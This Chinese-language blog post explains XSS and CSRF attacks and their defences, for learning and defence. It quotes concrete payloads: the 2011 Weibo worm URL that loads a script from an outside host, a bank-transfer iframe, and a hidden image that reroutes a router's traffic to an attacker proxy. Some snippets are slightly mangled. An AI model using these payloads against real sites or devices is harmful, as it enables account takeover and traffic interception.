---
title: xss 和 csrf 防范
date: 2018-11-20 15:08:36
tags:
- 网络
- 安全
categories: 网络
---

### XSS and CSRF

来自维基百科：

 - **CSS** 

跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。

XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。

 - **CSRF**

跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。[1] 跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。

#### XSS 攻击方法及防范

XSS 大致可以分为两类：反射型 XSS 和储存型 XSS 。

 - 反射型 XSS

被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。
URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。

 - 储存型 XSS

主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。典型的例子是留言板。

还有 DOM-based XSS（基于 DOM 的 XSS），一般是攻击者通过代码注入（输入框，留言板）执行恶意代码，盗取 cookie ，获取敏感信息，进一步发起 CSRF 。

防范：

 - 用户输入过滤。对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据
 - 用户输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到 `<script>` 中，可以进行JS编码。现在主流框架 Vue，React，或者衍生的 UI 框架，其实都有对输入输出做 XSS 防范。
 - 将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上cookie字段，但是在js脚本中却不能访问这个cookie，这样就避免了XSS攻击利用JavaScript的document.cookie获取cookie。【这种方法其实不是避免 XSS ，只是减小了可能的危害】

[2011年新浪微博的 XSS 攻击](https://coolshell.cn/articles/4914.html)是储存型 XSS 。其利用了微博广场页面 http://weibo.com/pub/star 的一个URL注入了js脚本，其通过 http://163.fm/PxZHoxn 短链接服务，将链接指向：

http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update

注意，上面URL链接中的其实就是 `<script src=//www.2kt.cn/images/t.js></script>`。

点击这个链接的用户会自动发一条类似“郭美美事件的一些未注意到的细节 https://t.cn/amsDE” 的微博（博文中的链接是一个新的 evil url，一旦其他用户点击，就会把类似链接传递下去）。

#### CSRF 攻击方法和防范

以下内容译自 [CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION](http://www.veracode.com/security/csrf)

CSRF：恶意网站向一个 Web app 发出请求，而用户已经在别的站点认证了这个 Web 程序。用这种方法，攻击者可以通过用户信任的浏览器，访问目标 web app 的功能。被攻击的目标包括 Web app，比如社交媒体，浏览器邮件客户端，网银和网络设备的 Web 界面。

---

##### CSRF 的关键概念

 - 恶意请求从用户访问的站点发送到攻击者觉得经过受害者认证的其他站点。
 - 通过目标站点身份验证的恶意请求，经受害者的浏览器被发送到目标站点。
 - 漏洞存在于受影响的 Web app 中，而不是受害者的浏览器或托管CSRF的站点。

---

##### 执行一次 CSRF 攻击

CSRF 中，攻击者利用了目标 Web app 的身份认证机制。一次 CSRF 中，受害者必须通过目标站点的身份认证（登陆）。举个例子，网银 `examplebank.com` 有 CSRF 漏洞，如果我浏览这个站点上藏有 CSRF 隐患的页面，但是我没有登录，那么无事发生。假如我登录了，攻击中的请求将被执行，看起来就好像是我做的一样。（浏览器无法辨别用户是否主动请求）。

接下来讲一下，上面的攻击的细节。首先假设我在 `examplebank.com` 登陆了我的帐号，所以我可以做一些网上银行操作，包括转账。

现在我碰巧访问了 `somemalicioussite.com` ，这个站点攻击 `examplebank.com` 的用户，并且在本站设置了一个 CSRF 攻击，中招的用户会向帐号 123456789 转帐 $1,500.00 。在 `somemalicioussite.com` 的某个地方，攻击者加了这样一行代码：

```javascript
<iframe src="//www.veracode.com/%3Ca%20href%3D"http://examplebank.com/app/transferFunds?amount=1500&destinationAccount=123456789">http://examplebank.com/app/transferFunds?amount=1500&destinationAccount=..." >
```

通过加载这个 iframe ，我的浏览器会向 `examplebank.com` 发送一条转账请求，因为我已经在 `examplebank.com` 登陆了，所以请求将被执行，$1,500.00 转给了帐号 123456789 。

---

##### 另一个 CSRF 例子

我买了一个新的家居无线路由器。同诸多 wifi 路由器，它通过一个 web 界面设置参数。我收到路由器的时候，它有一个内置 IP 地址 192.168.1.1 。我正不知如何设置路由器，刚好 `somemalicioussite.com` 上面有一个帖子有相关教程。攻击者在这个教程里面为我的路由器添加了一个代理，指向服务 123.45.67.89 ，以后通过路由器的流量都会经过这个代理，包括密码，sessionId。

当我点击这个教程的时候，我忽略了一张加载失败的 1px 的小图：

```javascript
<img src=”http://192.168.1.1/admin/config/outsideInterface?nexthop=123.45.67.89” alt=”pwned” height=”1” width=”1”/>
```

攻击者知道我正在读他们的教程，我会登陆路由器设置界面，所以他们把 CSRF 攻击藏在教程里面。有了上面的设置，我的路由会被添加一个代理服务器，所有经过路由器的流量也会经过这个代理服务器，攻击者就可以搞坏事了。

---

##### 预防 CSRF

 - 修改请求不要使用 GET ，暴露参数
 - img/script 标签可以跨域，能带上cookie，并且还支持除GET之外的其它方式。所以这种方式也是能实现CSRF的

方法一是每次请求都要在参数里面显示地带上token即登陆的票，虽然跨域请求能带上cookie，但是通过document.cookie仍然是获取不到其它源的cookie的，所以攻击者无法在代码里面拿到cookie里面的token，所以就没办法了。方法一的缺点是会暴露token，所以需要带token的最好不能是GET，因为GET会把参数拼在url里面，用户可能会无意把链接发给别人，但不知道这个链接带上了自己的登陆信息。

方法二是每次转账请求前都先请求一个随机串，这个串只能用一次转账或者支付请求，用完就废弃，只有这个串对得上才能请求成功，攻击者是无法拿到这个串的，因为如果跨域请求带cookie，浏览器要求Access-Control-Allow-Origin不能为通配符，只能为指定的源。

> 参考文章

> [对于跨站脚本攻击（XSS攻击）的理解和总结](https://www.imooc.com/article/13553)
> 
> [存储型XSS与反射型XSS有什么区别？](https://www.zhihu.com/question/21289758)
> 
> [新浪微博的XSS攻击](https://coolshell.cn/articles/4914.html)
>
> [CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION](http://www.veracode.com/security/csrf)
>
> [我知道的跨域与安全](https://fed.renren.com/2018/01/20/cross-origin/)